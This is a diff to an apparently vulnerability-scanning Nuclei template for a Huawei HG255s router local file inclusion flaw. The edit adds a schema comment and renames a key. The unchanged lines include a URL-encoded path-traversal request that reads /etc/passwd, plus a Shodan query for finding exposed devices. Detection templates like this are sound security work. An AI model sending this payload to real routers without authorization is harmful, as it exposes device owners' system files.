@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: huawei-hg255s-lfi
 info:
   name: Huawei HG255s - Local File Inclusion
@@ -14,7 +15,7 @@ info:
   metadata:
     shodan-query: http.html:"HG532e"
   tags: huawei,lfi,router
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
